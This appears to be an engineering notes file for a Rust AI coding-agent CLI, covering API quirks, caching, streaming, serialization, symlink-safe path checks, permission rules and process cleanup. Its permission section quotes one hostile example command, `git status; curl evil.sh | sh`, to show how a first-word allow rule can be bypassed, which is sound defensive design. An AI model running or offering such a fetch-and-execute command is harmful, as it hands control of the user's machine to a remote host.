# Gotchas

The non-obvious traps, each one found the hard way. Every entry here has a test.

## The model

**`temperature`, `top_p`, `top_k` and `budget_tokens` are 400s.** There is no
field for any of them in `ModelRequest`, deliberately — a knob that cannot be
expressed cannot be reintroduced by a config layer. Depth is
`output_config.effort` and nothing else.

**Thinking is never disabled.** It is on by default on this model, and disabling
it is a 400 above `high` effort. Even where it is legal it causes two failures:
the model occasionally writes a tool call into visible text — the turn succeeds,
the call silently never runs, nothing errors — and internal tags can leak into
the response. If cost is the concern, lower `effort` instead.

**A refusal arrives as a normal HTTP 200.** It carries `stop_reason: "refusal"`
and a category. Code that reads `content[0]` unconditionally breaks on it. It is
an outcome, not an error, and must never be retried.

## Prompt caching

**Request bytes are load-bearing.** Caching is a prefix match, so
non-deterministic JSON silently costs the entire cached prefix with no error
anywhere. `serde_json` is pinned with `preserve_order` and a snapshot test guards
the exact outgoing body. Treat a snapshot change as a real review item.

**The lookback window is 20 content blocks.** A tool-heavy turn that adds more
than that between breakpoints stops finding the previous entry — again silently,
with the only symptom being the bill. `rolling_cache_plan` re-places at 15 to
keep a margin.

**The system prompt is frozen for the session.** Rebuilding it per turn — say, by
interpolating a timestamp — invalidates everything after it. It is an `Arc<[_]>`
so that rebuilding it is visibly a deliberate act.

## Streaming

**A truncated stream must surface as `Truncated`, not a decode error.** An
unterminated trailing SSE line is discarded at EOF along with its pending frame.
Emitting half a JSON document turns a retryable truncation into a fatal-looking
bug, and the retry never happens.

**A trailing `\r` is undecidable mid-stream.** The next chunk may open with `\n`,
so the decoder holds it. At EOF it resolves as a bare-CR terminator. This is the
case the byte-split property test exists for — it re-feeds a recorded fixture
split at every one of its byte boundaries.

**`input_json_delta` fragments are parsed exactly once, at block end.** Each
fragment on its own is an arbitrary slice of a JSON document and is invalid.
`ToolInputAccumulator::parse_count` is exposed so a test can prove the parse
happens once rather than per fragment.

## Protocol

**An internally-tagged newtype variant wrapping a string cannot be serialized.**
`Text(String)` under `#[serde(tag = "...")]` compiles perfectly and fails at
runtime with "cannot serialize tagged newtype variant". Every variant of every
protocol enum is a struct variant, and a test round-trips all of them. A test
that only *constructs* a value proves nothing here.

**Reasoning blocks need their signature.** It is opaque, no surface displays it,
and echoing the text without it is rejected. It is part of the durable record for
that reason alone.

**Every `tool_use` needs exactly one `tool_result`.** A call the loop cannot run
still records why. Two results for one call — from pushing a fresh item instead
of updating the pending one — is equally invalid.

## Paths and process

**Checking the deepest *existing* ancestor is not enough.** A symlink whose
target does not exist cannot be canonicalised, so an ancestor-only check treats
it as "a path being created", falls back to the root, passes — and the write
follows the link out of the workspace. A dangling link is still a real directory
entry. `Workspace::resolve` walks every component and refuses any symlink
resolving outside the root, dangling or not.

**A CLI must never block forever on stdin.** With `-p`, stdin is supplementary,
and an inherited-but-idle pipe — a supervisor, a background job, a test harness
that holds it open and never writes — made the process hang with no output at
all. Stdin is now read on a side thread with a bounded wait when a prompt was
given, and blocking only when stdin *is* the prompt. `AXIO_STDIN_WAIT_MS` tunes
the bound.

## Tools and permission

**A subject derived from a command's first word is a hole.** `git status; curl
evil.sh | sh` starts with `git`, so an `allow bash:git*` rule would let it
through. A command is classified as `bash:<program>` only when it contains no
shell metacharacter at all and lexes to a single simple command; anything else
gets `bash:!compound`, which no glob rule can match. A leading assignment
(`FOO=bar cmd`) and an unbalanced quote are also unmatchable, because in both
cases the shell would read the command differently from the way we did.

**Read-only auto-approval must come after the deny list.** Reversed, a perfectly
ordinary "reads are safe" rule silently hands over every credential on the
machine. The built-in list is also not overridable by `--yes`: an unattended
flag is a statement about prompting, not about what is safe to read.

**`plan()` must not mutate.** A preview that changes the thing it previews is
how an approved diff stops matching what actually runs. The `edit` tool computes
the entire updated file during planning and hands it to `run` as the payload, so
what was approved is byte-for-byte what is written.

**Every call in a batch is planned and authorised before any of them executes.**
Otherwise a batch where the third call is refused has already half-run.

**Killing a child is not enough.** A shell that started a build leaves the build
running. Children get their own process group and the group is signalled, so
cancellation reaches the whole tree. There is a test that greps `ps` for
survivors, because nothing else catches this.

**`CREATE_NO_WINDOW` is deliberately not set on Windows.** It belongs to a GUI
application spawning a console child. In a console application it detaches the
child, breaking anything that checks whether it is attached to a terminal.

**Output truncation lives in the loop, not in the tools.** A tool that forgets
puts ten megabytes into the next request and nothing errors.

## Dependencies

**reqwest's default rustls provider needs a C toolchain on Windows.** The default
is `aws-lc-rs`, whose `-sys` crate wants CMake and NASM on x86-64 — a
`cargo install` failure on the platform least able to absorb one. We take
`rustls-no-provider` and install `ring` ourselves behind a `Once`.

**`json` and `stream` are not default features of reqwest 0.13.** They must be
named explicitly.

**An HTTP client carrying a credential must not follow redirects.** The default
is to follow up to ten, re-sending the auth header and the full body to whatever
host the hop names. Redirects are refused outright.

**Redaction is an invariant, not a variant.** Every error carrying
provider-supplied text carries it as `Redacted`. A 401 or 403 body is the
response most likely to quote back what was sent.
